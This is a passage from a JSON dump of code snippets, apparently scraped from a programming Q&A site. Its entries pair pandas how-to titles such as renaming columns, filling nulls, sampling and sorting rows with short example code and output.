    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2675,
    "keyword": null,
    "link": null,
    "title": " pandas reciprocal",
    "description": "import numpy as np import pandas as pd #There are two ways to get the reciprocal of a dataframe: #First way: df.rdiv(1) #Second way: np.reciprocal(df) #If you want the reciprocal of just one row then use .iloc[]                   #to do that\n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2676,
    "keyword": null,
    "link": null,
    "title": " pandas remame a no name column",
    "description": "data.rename( columns={'Unnamed: 0':'new column name'}, inplace=True )\n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2677,
    "keyword": null,
    "link": null,
    "title": " pandas remove char from column",
    "description": "df['result'] = df['result'].str.replace(r'\\D', '') df      time result 1  09:00     52 2  10:00     62 3  11:00     44 4  12:00     30 5  13:00    110 \n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2678,
    "keyword": null,
    "link": null,
    "title": " pandas remove row if missing value in column",
    "description": "# remove all rows without a value in the 'name' column df = df[df['name'].notna()] \ndf.dropna()     #drop all rows that have any NaN values df.dropna(how='all')\n# Drop rows which contain any NaN value in the selected columns mod_df = df.dropna( how='any',                     subset=['Name', 'Age'])\n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2679,
    "keyword": null,
    "link": null,
    "title": " pandas remove rows with null in column",
    "description": "df.dropna() \ndf = df[df['EPS'].notna()] \nDataFrame.dropna() method \n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2680,
    "keyword": null,
    "link": null,
    "title": " pandas remove time from datetime",
    "description": "In [37]:  df = pd.DataFrame({'date':['2015-02-21 12:08:51']}) df Out[37]:                   date 0  2015-02-21 12:08:51 In [39]:  df['date'] = pd.to_datetime(df['date']).dt.date df Out[39]:          date 0  2015-02-21\n# If opening_date is currently a timestamp: 2021-01-09 00:00:00 opening_date = pd.to_datetime(opening_date).date() print(opening_date)   # Result: 2021-01-09\n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2681,
    "keyword": null,
    "link": null,
    "title": " pandas remove timezone info",
    "description": "testdata['time'].dt.tz_localize(None)\n",
    "reg_date": "2021-10-12T11:32:11.000Z"
  },
  {
    "id": 2682,
    "keyword": null,
    "link": null,
    "title": " pandas rename",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\ndf_new = df.rename(columns={'A': 'a'}) #change a from A\nimport pandas as pd data = pd.read_csv(file) data.rename(columns={'original':'new_name'}, inplace=True)\n# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\n>>> df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]}) >>> df.rename(columns={\"A\": \"a\", \"B\": \"c\"})    a  c 0  1  4 1  2  5 2  3  6 \n>>> df.rename(index={0: \"x\", 1: \"y\", 2: \"z\"})    A  B x  1  4 y  2  5 z  3  6 \n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2683,
    "keyword": null,
    "link": null,
    "title": " pandas rename column",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\nimport pandas as pd data = pd.read_csv(file) data.rename(columns={'original':'new_name'}, inplace=True)\n# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}, inplace=True)\ndf.rename({'current':'updated'},axis = 1, inplace = True) \n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2684,
    "keyword": null,
    "link": null,
    "title": " pandas rename column name",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\nimport pandas as pd data = pd.read_csv(file) data.rename(columns={'original':'new_name'}, inplace=True)\n# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}, inplace=True)\ndf = df.rename(columns={'oldName1': 'newName1', 'oldName2': 'newName2'}) # Or rename the existing DataFrame (rather than creating a copy)  df.rename(columns={'oldName1': 'newName1', 'oldName2': 'newName2'}, inplace=True) \n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2685,
    "keyword": null,
    "link": null,
    "title": " pandas rename index values",
    "description": "df.rename(index={'alpha': 'mu'})\ndf.index.name                      # Show me the current name df.index.name = 'my_column_name'   # Change the index name to my_column_name\ndf.index.names = ['new_name']\nimport pandas as pd     # Sample DataFrame  df = pd.DataFrame({'a': [1, 2], 'b': [3, 4]})     # Changing columns name with index number  df.columns.values[0] = \"b\" df.columns.values[1] = \"a\"    # Display  display(df)  \n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2686,
    "keyword": null,
    "link": null,
    "title": " pandas rename specific column",
    "description": "df_new = df.rename(columns={'A': 'a'}) #change a from A\ndf.rename(columns={'old_name': 'new_name'}, inplace=True)\n>gapminder.columns = ['country','year','population',                      'continent','life_exp','gdp_per_cap'] \n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2687,
    "keyword": null,
    "link": null,
    "title": " pandas replace colomns location",
    "description": "df = df.reindex(['B','C','A'], axis=1) \n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2688,
    "keyword": null,
    "link": null,
    "title": " pandas replace column name spaces with underscore",
    "description": "import pandas as pd   # remove spaces in columns name df.columns = df.columns.str.replace(' ','_')\n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2689,
    "keyword": null,
    "link": null,
    "title": " pandas replace empty string with nan",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].fillna(0) \ndf = df.replace(r'^\\s*$', np.NaN, regex=True)\ndf.fillna(0)\nIn [7]: df Out[7]:            0         1 0       NaN       NaN 1 -0.494375  0.570994 2       NaN       NaN 3  1.876360 -0.229738 4       NaN       NaN  In [8]: df.fillna(0) Out[8]:            0         1 0  0.000000  0.000000 1 -0.494375  0.570994 2  0.000000  0.000000 3  1.876360 -0.229738 4  0.000000  0.000000\ndef exercise4(df):     df1 = df.select_dtypes(np.number)     df2 = df.select_dtypes(exclude = 'float')     mode = df2.mode()     df3 = df1.fillna(df.mean())     df4 = df2.fillna(mode.iloc[0,:])     new_df = [df3,df4]     df5 = pd.concat(new_df,axis=1)     new_cols = list(df.columns)     df6 = df5[new_cols]     return df6\n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2690,
    "keyword": null,
    "link": null,
    "title": " pandas replace nan",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].fillna(0) \ndf['product']=df['product'].fillna(0) df['context']=df['context'].fillna(0) df\ndf = df.replace(r'^\\s*$', np.NaN, regex=True)\ndata[\"Gender\"].fillna(\"No Gender\", inplace = True) \npandas.DataFrame.fillna(0)\ndf.fillna('', inplace=True)\n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2691,
    "keyword": null,
    "link": null,
    "title": " pandas replace null values with values from another column",
    "description": "#Python #Col 1 = where you want the values replaced #Col 2 = where you want to take the values from df[\"Col 1\"].fillna(df[\"Col 2\"], inplace=True) \ndf.fillna(method='ffill')\n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2692,
    "keyword": null,
    "link": null,
    "title": " pandas replace null with 0",
    "description": "df.column.fillna(0,inplace=True)\ndf['DataFrame Column'] = df['DataFrame Column'].fillna(0) \ndf['product']=df['product'].fillna(0) df['context']=df['context'].fillna(0) df\ndf['col1'] = df['col1'].fillna(0)\ndf.fillna('', inplace=True)\ndf.fillna(0)\n",
    "reg_date": "2021-10-12T11:32:12.000Z"
  },
  {
    "id": 2693,
    "keyword": null,
    "link": null,
    "title": " pandas replace nulls with zeros",
    "description": "df['col1'] = df['col1'].fillna(0)\n# in column_B of dataframe, replace zero with blanks df['column_B'].replace(['0', '0.0'], '', inplace=True)\nnonzero_mean = df[ df.col != 0 ].mean() \n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2694,
    "keyword": null,
    "link": null,
    "title": " pandas replace values in column based on condition",
    "description": "In [41]: df.loc[df['First Season'] > 1990, 'First Season'] = 1 df  Out[41]:                  Team  First Season  Total Games 0      Dallas Cowboys          1960          894 1       Chicago Bears          1920         1357 2   Green Bay Packers          1921         1339 3      Miami Dolphins          1966          792 4    Baltimore Ravens             1          326 5  San Franciso 49ers          1950         1003\ndf.loc[df['employrate'] > 70, 'employrate'] = 7\ndf.loc[df['First Season'] > 1990, 'First Season'] = 1 \n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2695,
    "keyword": null,
    "link": null,
    "title": " pandas resample backfill",
    "description": "#Upsampling and backward filling for weekly frequency data.resample('W').bfill()\n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2696,
    "keyword": null,
    "link": null,
    "title": " pandas return first row",
    "description": "df_test.iloc[0] or df_test['someColumnName'].iloc[0]\n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2697,
    "keyword": null,
    "link": null,
    "title": " pandas return rows that don't have null",
    "description": "# Basic syntax: # Remove rows that have missing entries in specific column: df[~df['column'].isnull()] # Where df['Age'].isnull() returns a Series of booleans that are true #\twhen 'column' has an empty row. The ~ negates the Series so that you #\tobtain the rows of df the don't have empty values in 'column'  # Remove rows that have missing entries in any column: df.dropna()  # Example usage: import pandas as pd # Create dataframe df = pd.DataFrame({'Last_Name': ['Smith', None, 'Brown'],                     'First_Name': ['John', 'Mike', 'Bill'],                    'Age': [35, 45, None]})  print(df)   Last_Name First_Name   Age 0     Smith       John  35.0 1      None       Mike  45.0 2     Brown       Bill   NaN  df[~df['Age'].isnull()] # Returns:   Last_Name First_Name   Age 0     Smith       John  35.0 1      None       Mike  45.0  df.dropna() # Returns:   Last_Name First_Name   Age 0     Smith       John  35.0\n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2698,
    "keyword": null,
    "link": null,
    "title": " pandas sample",
    "description": ">>> df.sample(frac=0.5, replace=True, random_state=1)       num_legs  num_wings  num_specimen_seen dog          4          0                  2 fish         0          0                  8 \n>>> df['num_legs'].sample(n=3, random_state=1) fish      0 spider    8 falcon    2 Name: num_legs, dtype: int64 \n>>> df = pd.DataFrame({'num_legs': [2, 4, 8, 0], ...                    'num_wings': [2, 0, 0, 0], ...                    'num_specimen_seen': [10, 2, 1, 8]}, ...                   index=['falcon', 'dog', 'spider', 'fish']) >>> df         num_legs  num_wings  num_specimen_seen falcon         2          2                 10 dog            4          0                  2 spider         8          0                  1 fish           0          0                  8 \n>>> import pandas as pd >>> sentence = 'The quick brown fox jumps over a lazy dog.' >>> words = sentence.split(' ') >>> df1 = pd.DataFrame({'key': range(len(words)), ...                     'column1_Words': words, ...                     'column2_Length': [len(x) for x in words] ...                     }) >>> df1    key column1_Words  column2_Length 0    0           The               3 1    1         quick               5 2    2         brown               5 3    3           fox               3 4    4         jumps               5 5    5          over               4 6    6             a               1 7    7          lazy               4 8    8          dog.               4 >>> \n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2699,
    "keyword": null,
    "link": null,
    "title": " pandas sample rows",
    "description": "# To sample a fixed number of rows df.sample(n = 100)  # To sample a fraction of rows df.sample(frac = 0.5)\n>>> df = pd.DataFrame({'num_legs': [2, 4, 8, 0], ...                    'num_wings': [2, 0, 0, 0], ...                    'num_specimen_seen': [10, 2, 1, 8]}, ...                   index=['falcon', 'dog', 'spider', 'fish']) >>> df         num_legs  num_wings  num_specimen_seen falcon         2          2                 10 dog            4          0                  2 spider         8          0                  1 fish           0          0                  8 \n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2700,
    "keyword": null,
    "link": null,
    "title": " pandas sample seed",
    "description": ">>> df.sample(frac=0.5, replace=True, random_state=1)       num_legs  num_wings  num_specimen_seen dog          4          0                  2 fish         0          0                  8 \n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2701,
    "keyword": null,
    "link": null,
    "title": " pandas save file to pickle",
    "description": "import pandas as pd df.to_pickle(file_name) # save df = pd.read_pickle(file_name) # load\n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2702,
    "keyword": null,
    "link": null,
    "title": " pandas save without index",
    "description": "df.to_csv('out.csv')\ndf.to_csv('file_name.csv')\n#Save to csv without index: df.to_csv('name.csv', index=False)\ndf.to_csv(file_name, sep='\\t')\n",
    "reg_date": "2021-10-12T11:32:13.000Z"
  },
  {
    "id": 2703,
    "keyword": null,
    "link": null,
    "title": " pandas scientific notation",
    "description": "In [25]: pd.set_option('display.float_format', lambda x: '%.3f' % x)  In [28]: Series(np.random.randn(3))*1000000000 Out[28]:  0    -757322420.605 1   -1436160588.997 2   -1235116117.064 dtype: float64 \n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2704,
    "keyword": null,
    "link": null,
    "title": " pandas see all columns",
    "description": "pd.set_option('display.max_columns', None) movies.head()\npd.set_option('display.max_columns', None) pd.set_option('display.max_rows', None)\npd.set_option('max_columns', None)\n# This will print all columns and rows # 'display.max_colwidth', -1  will print entire row content  pd.set_option(\"display.max_rows\", None, \"display.max_columns\", None,'display.max_colwidth', -1)\npd.options.display.max_columns = None pd.options.display.max_rows = None\nprint(dataframe.columns)\n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2705,
    "keyword": null,
    "link": null,
    "title": " pandas select by column value",
    "description": "df.loc[df['column_name'] == some_value]\n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2706,
    "keyword": null,
    "link": null,
    "title": " pandas select by couluimn value",
    "description": "df.loc[df['column_name'] == some_value]\n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2707,
    "keyword": null,
    "link": null,
    "title": " pandas select column by index",
    "description": "#    A  B  C # 0  1  3  5 # 1  2  4  6  column_B = a_dataframe.iloc[:, 1] print(column_B)  # OUTPUT # 0    3 # 1    4\nfrom pandas import DataFrame  boxes = {'Color': ['Green','Green','Green','Blue','Blue','Red','Red','Red'],          'Shape': ['Rectangle','Rectangle','Square','Rectangle','Square','Square','Square','Rectangle'],          'Price': [10,15,5,5,10,15,15,5]         }  df = DataFrame(boxes, columns= ['Color','Shape','Price'])  select_color = df.loc[df['Color'] == 'Green'] print (select_color) \ndf1 = df.iloc[:,0:2] # Remember that Python does not slice inclusive of the ending index.\niloc - default indexes (system generated) loc - table indexes or we manually given indexes \nrowData = dfObj.loc[ 'b' , : ] \ndf = df.loc[df.index.repeat(df['a'])]    df['c'] = df.groupby(level=0).cumcount() + 1 df = df.reset_index(drop=True) print (df)    a  b  c 0  1  x  1 1  2  y  1 2  2  y  2 3  3  z  1 4  3  z  2 5  3  z  3 \n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2708,
    "keyword": null,
    "link": null,
    "title": " pandas select columns where value is true",
    "description": "df.loc[df['column_name'] == some_value]\n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2709,
    "keyword": null,
    "link": null,
    "title": " pandas select row by index",
    "description": "#for single row df.loc[ index , : ]  # for multiple rows indices = [1, 20, 33, 47, 52 ] new_df= df.iloc[indices, :]\ndf.iloc[[index]] \nrow_data = df.loc[ 'a' , : ]\ndfObj.iloc[: , [0, 2]] \nfrom pandas import DataFrame  boxes = {'Color': ['Green','Green','Green','Blue','Blue','Red','Red','Red'],          'Shape': ['Rectangle','Rectangle','Square','Rectangle','Square','Square','Square','Rectangle'],          'Price': [10,15,5,5,10,15,15,5]         }  df = DataFrame(boxes, columns= ['Color','Shape','Price'])  select_color = df.loc[df['Color'] == 'Green'] print (select_color) \niloc - default indexes (system generated) loc - table indexes or we manually given indexes \n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2710,
    "keyword": null,
    "link": null,
    "title": " pandas select rows that contain substring",
    "description": "df[df['A'].str.contains(\"hello\")] \n# Basic syntax to select rows that contain one substring: import pandas as pd df[df['column_name'].str.contains('substring')]  # Note, this only returns rows that contain substring in the specified #\tcolumn, it doesn't look for the substring in all columns # Note, substring can be replaced with any REGEX expression  # Basic syntax to select rows that contain 2+ substrings: import pandas as pd df[df['column_name'].str.contains('substring_1|substring_2')] # Where you can keep adding substrings to look for separated by |  # Basic syntax to select rows that do not contain substring: import pandas as pd df[~df['column_name'].str.contains('substring')] # Where the ~ acts as a NOT to negate the results of the search\n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2711,
    "keyword": null,
    "link": null,
    "title": " pandas series plot horizontal bar",
    "description": "import matplotlib.pyplot as plt series.plot(kind='barh') plt.show()\n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2712,
    "keyword": null,
    "link": null,
    "title": " pandas series remove punctuation",
    "description": "# Define the function to remove the punctuation def remove_punctuations(text):     for punctuation in string.punctuation:         text = text.replace(punctuation, '')     return text # Apply to the DF series df['new_column'] = df['column'].apply(remove_punctuations)\n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2713,
    "keyword": null,
    "link": null,
    "title": " pandas series select first value",
    "description": "df = pd.DataFrame([[1, 2], [3, 4]], ['a', 'b'], ['A', 'B']) df['A'].iloc[0]  # first item in a Series (Column)\n",
    "reg_date": "2021-10-12T11:32:14.000Z"
  },
  {
    "id": 2714,
    "keyword": null,
    "link": null,
    "title": " pandas series to list",
    "description": "lst = data.tolist() # data is pandas series\n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2715,
    "keyword": null,
    "link": null,
    "title": " pandas set a column as index",
    "description": "df = pd.DataFrame({'month': [1, 4, 7, 10],                    'year': [2012, 2014, 2013, 2014],                    'sale': [55, 40, 84, 31]})  df.set_index('month')\ndf = df.set_index('col') df['col'] = df.index\n>>> df.set_index('month')        year  sale month 1      2012    55 4      2014    40 7      2013    84 10     2014    31 \ndf = df.set_index('col')\n>>> df = df.set_index('Identifier') >>> df.head()                 Place of Publication Date of Publication  \\ 206                           London         1879 [1878] 216         London; Virtue & Yorston                1868 218                           London                1869 472                           London                1851 480                           London                1857                          Publisher  \\ 206              S. Tinsley & Co. 216                  Virtue & Co. 218         Bradbury, Evans & Co. 472                 James Darling 480          Wertheim & Macintosh                                                          Title     Author  \\ 206                         Walter Forbes. [A novel.] By A. A      A. A. 216         All for Greed. [A novel. The dedication signed...  A., A. A. 218         Love the Avenger. By the author of &ldquo;All for Gr...  A., A. A. 472         Welsh Sketches, chiefly ecclesiastical, to the...  A., E. S. 480         [The World in which I live, and my place in it...  A., E. S.                                                     Flickr URL 206         http://www.flickr.com/photos/britishlibrary/ta... 216         http://www.flickr.com/photos/britishlibrary/ta... 218         http://www.flickr.com/photos/britishlibrary/ta... 472         http://www.flickr.com/photos/britishlibrary/ta... 480         http://www.flickr.com/photos/britishlibrary/ta... \n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2716,
    "keyword": null,
    "link": null,
    "title": " pandas set options",
    "description": "import pandas as pd pd.set_option('display.max_rows', 500) pd.set_option('display.max_columns', 500) pd.set_option('display.width', 1000) pd.set_option('max_colwidth', -1)\npd.set_option('display.max_columns', 200) pd.set_option('display.max_rows', 100) pd.set_option('display.min_rows', 100) pd.set_option('display.expand_frame_repr', True) \n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2717,
    "keyword": null,
    "link": null,
    "title": " pandas shift all columns",
    "description": "import pandas as pd   info= pd.DataFrame({'a_data': [45, 28, 39, 32, 18],   'b_data': [26, 38, 41, 35, 45],   'c_data': [22, 19, 11, 25, 16]})    #shifting code info.shift(periods=2)    info.shift(periods=2,axis=1,fill_value= 70)  \n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2718,
    "keyword": null,
    "link": null,
    "title": " pandas shift columns down until value",
    "description": "#We create a shift down method so that we can have all the preious summed values in the bottom index and hence #deleting them would be easy  def shift_down(data):     i=0     while(i<len(data.columns)):         while(pd.isnull(data.iloc[len(data.index)-1,i])==True):             data.iloc[:,i] = data.iloc[:, i].shift(1)         i+=1     return data\n#We create a function to shift up the data of each column up until the first actual number def shift_up(data):     i=0     while(i<len(data.columns)):         while(pd.isnull(data.iloc[0,i])==True):             data.iloc[:,i]=data.iloc[:,i].shift(-1)         i+=1     return data\n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2719,
    "keyword": null,
    "link": null,
    "title": " pandas shift columns up until value",
    "description": "#We create a function to shift up the data of each column up until the first actual number def shift_up(data):     i=0     while(i<len(data.columns)):         while(pd.isnull(data.iloc[0,i])==True):             data.iloc[:,i]=data.iloc[:,i].shift(-1)         i+=1     return data\n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2720,
    "keyword": null,
    "link": null,
    "title": " pandas show all rows",
    "description": "pd.set_option('display.max_columns', None)  # or 1000 pd.set_option('display.max_rows', None)  # or 1000 pd.set_option('display.max_colwidth', -1)  # or 199\nwith pd.option_context('display.max_rows', None, 'display.max_columns', None):  # more options can be specified also     print(df)  # u can also use display(df) if using jupyter notebook. # this will automatically set the value options to previos values.\nwith pd.option_context('display.max_rows', None, 'display.max_columns', None):  # more options can be specified also     print(df)\nimport pandas as pd pd.options.display.max_rows = 999  pd.options.display.max_columns = 999\n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2721,
    "keyword": null,
    "link": null,
    "title": " pandas show large numbers with commas",
    "description": "#make large numbers more readable by adding commas pd.options.display.float_format = '{:,}'.format # Example 123456789.12345 -> 123,456,789.12345  #this adds commas and limits decimals to 2 places pd.options.display.float_format = '{:,.2f}'.format # Example 123456789.12345 -> 123,456,789.12  #this adds the dollar sign to the front pd.options.display.float_format = '${:,.2f}'.format # Example 123456789.12345 -> $123,456,789.12\n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2722,
    "keyword": null,
    "link": null,
    "title": " pandas shuffle rows",
    "description": "# Basic syntax: df = df.sample(frac=1, random_state=1).reset_index(drop=True) # Where: #\t- frac=1 specifies returning 100% of the original rows of the  #\t\tdataframe (in random order). Change to a decimal (e.g. 0.5) if #\t\tyou want to sample say, 50% of the original rows #\t- random_state=1 sets the seed for the random number generator and #\t\tis useful to specify if you want results to be reproducible #\t- .reset_index(drop=True) specifies resetting the row index of the #\t\tshuffled dataframe\ndf = df.sample(frac=1).reset_index(drop=True)\n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2723,
    "keyword": null,
    "link": null,
    "title": " pandas slice based on column value",
    "description": "df.loc[df['column_name'] == some_value]\n",
    "reg_date": "2021-10-12T11:32:15.000Z"
  },
  {
    "id": 2724,
    "keyword": null,
    "link": null,
    "title": " pandas sort columns by name",
    "description": "df.sort_values(by='col1', ascending=False)\ndf = df.reindex(sorted(df.columns), axis=1) \nfinal_df = df.sort_values(by=['2'], ascending=False)\nsorted = df.sort_values('column-to-sort-on', ascending=False) #or df.sort_values('name', inplace=True) \n# Basic syntax: import pandas as pd df.sort_values(by=['col1'])  # Note, this does not sort in place unless you add inplace=True # Note, add ascending=False if you want to sort in decreasing order # Note, to sort by more than one column, add other column names to the #\tlist like by=['col1', 'col2']\n#old df columns df.columns Index(['A', 'B', 'C', 'D'],dtype='***') #new column format that we want to rearange new_col = ['D','C','B','A'] #list of column name in order that we want  df = df[new_col] df.columns Index(['D', 'C', 'B', 'A'],dtype='***') #new column order\n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2725,
    "keyword": null,
    "link": null,
    "title": " pandas sort values by multiple columns",
    "description": "df.sort_values(['a', 'b'], ascending=[True, False])\ndf = df.sort_values([\"b\", \"c\"], ascending = (False, True))\nsorted_array = an_array[numpy.argsort(an_array[:, 1])]\nresult = df1.merge(df2, how='outer').sort_index(axis=1) \n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2726,
    "keyword": null,
    "link": null,
    "title": " pandas sort values group by",
    "description": "df.groupby(['job']).apply(lambda x: (x.groupby('source')                                       .sum()                                       .sort_values('count', ascending=False))                                      .head(3))\nimport pandas as pd  df = pd.DataFrame({'A':[1, 2, 3, 4, 5, 6],                    'B':[0, 1, 2, 0, 1, 2]})  df.groupby('B').apply(lambda x: x.sort_values('A', ascending = True))\n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2727,
    "keyword": null,
    "link": null,
    "title": " pandas split by space",
    "description": "# importing pandas module   import pandas as pd   # new data frame with split value columns  data[\"Team\"]= data[\"Team\"].str.split(\" \", n = 1, expand = True)   # df display  data \n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2728,
    "keyword": null,
    "link": null,
    "title": " pandas split column into multiple columns by delimiter",
    "description": "df[['A', 'B']] = df['AB'].str.split(' ', 1, expand=True) \nd = [pd.DataFrame(df[col].tolist()).add_prefix(col) for col in df.columns] df = pd.concat(d, axis=1)     id0  id1   id2  value0  value1  value2 0   10   10   NaN   apple  orange    None 1   15   67   NaN  banana  orange    None 2   12   34  45.0   apple  banana  orange\ndf.Name.str.split(expand=True,)           0  1 0   Steve   Smith 1   Joe Nadal 2   Roger   Federer \n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2729,
    "keyword": null,
    "link": null,
    "title": " pandas split dataframe to train and test",
    "description": "train=df.sample(frac=0.8,random_state=200) #random state is a seed value test=df.drop(train.index)\n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2730,
    "keyword": null,
    "link": null,
    "title": " pandas standard deviation on column",
    "description": "dataframe['colname'].std()\n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2731,
    "keyword": null,
    "link": null,
    "title": " pandas sum multiple columns groupby",
    "description": "df.groupby(['col1','col2']).agg({'col3':'sum','col4':'sum'}).reset_index() \n#UPDATED (June 2020): Introduced in Pandas 0.25.0,  #Pandas has added new groupby behavior &ldquo;named aggregation&rdquo; and tuples,  #for naming the output columns when applying multiple aggregation functions  #to specific columns.  df.groupby(      ['col1','col2']  ).agg(      sum_col3 = ('col3','sum'),      sum_col4     = ('col4','sum'),  ).reset_index() \n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2732,
    "keyword": null,
    "link": null,
    "title": " pandas sum rows",
    "description": "# Basic syntax: df.sum(axis=1)  # Create new column consisting of row sums across specific columns: df['sums'] = df.iloc[:, 6:23].sum(axis=1)  # Where: #\t- iloc allows you to specify the rows and columns with slicing. Here #\t\tI select all rows and sum over columns 6-22 #\t- df['sums'] is how you assign a new column named 'sums' to the df  # Example usage: import pandas as pd import numpy as np  # Create dataframe: df = pd.DataFrame(np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]),                    columns=['a', 'b', 'c'])  print(df)    a  b  c 0  1  2  3 1  4  5  6 2  7  8  9  # Sum columns 1-2: df['sums'] = df.iloc[:, 1:3].sum(axis=1)  print(df)    a  b  c  sums 0  1  2  3     5 1  4  5  6    11 2  7  8  9    17\nimport numpy as np import pandas as pd   df = pd.DataFrame({'a': [10,20],'b':[100,200],'c': ['a','b']})  df.loc['Column_Total']= df.sum(numeric_only=True, axis=0) df.loc[:,'Row_Total'] = df.sum(numeric_only=True, axis=1)  print(df)                   a      b    c  Row_Total 0             10.0  100.0    a      110.0 1             20.0  200.0    b      220.0 Column_Total  30.0  300.0  NaN      330.0\ndf.groupby(['Fruit','Name'])['Number'].sum()\ndf.sum(axis=1)\n# select numeric columns and calculate the sums sums = df.select_dtypes(pd.np.number).sum().rename('total')  # append sums to the data frame df.append(sums) #         X  MyColumn      Y      Z #0        A      84.0   13.0   69.0 #1        B      76.0   77.0  127.0 #2        C      28.0   69.0   16.0 #3        D      